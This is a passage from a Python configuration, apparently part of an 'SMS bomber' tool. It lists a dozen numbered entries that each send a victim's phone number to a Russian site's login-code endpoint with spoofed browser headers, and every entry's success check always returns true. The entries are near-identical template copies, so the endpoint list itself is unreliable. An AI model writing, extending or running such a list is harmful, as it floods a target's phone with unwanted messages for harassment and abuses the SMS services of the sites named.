        "url": "https://priuralsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priuralsky-system.ru/", "https://priuralsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1790": {
        "name": "TazovskyGlobalUni",
        "url": "https://tazovsky-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky-global.ru/", "https://tazovsky-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1791": {
        "name": "SalekhardGlobalUni",
        "url": "https://salekhard-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://salekhard-global.ru/", "https://salekhard-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1792": {
        "name": "NovyUrengoyGlobalUni",
        "url": "https://novy-urengoy-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novy-urengoy-global.ru/", "https://novy-urengoy-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1793": {
        "name": "NoyabrskGlobalUni",
        "url": "https://noyabrsk-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk-global.ru/", "https://noyabrsk-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1794": {
        "name": "GubkinskyGlobalUni",
        "url": "https://gubkinsky-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky-global.ru/", "https://gubkinsky-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1795": {
        "name": "LabytnangiGlobalUni",
        "url": "https://labytnangi-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi-global.ru/", "https://labytnangi-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1796": {
        "name": "MuravlenkoGlobalUni",
        "url": "https://muravlenko-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko-global.ru/", "https://muravlenko-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1797": {
        "name": "RaduzhnyGlobalUni",
        "url": "https://raduzhny-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://raduzhny-global.ru/", "https://raduzhny-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1798": {
        "name": "MegionGlobalUni",
        "url": "https://megion-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megion-global.ru/", "https://megion-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1799": {
        "name": "LangepasGlobalUni",
        "url": "https://langepas-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://langepas-global.ru/", "https://langepas-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1800": {
        "name": "PokachiGlobalUni",
        "url": "https://pokachi-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pokachi-global.ru/", "https://pokachi-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    
}
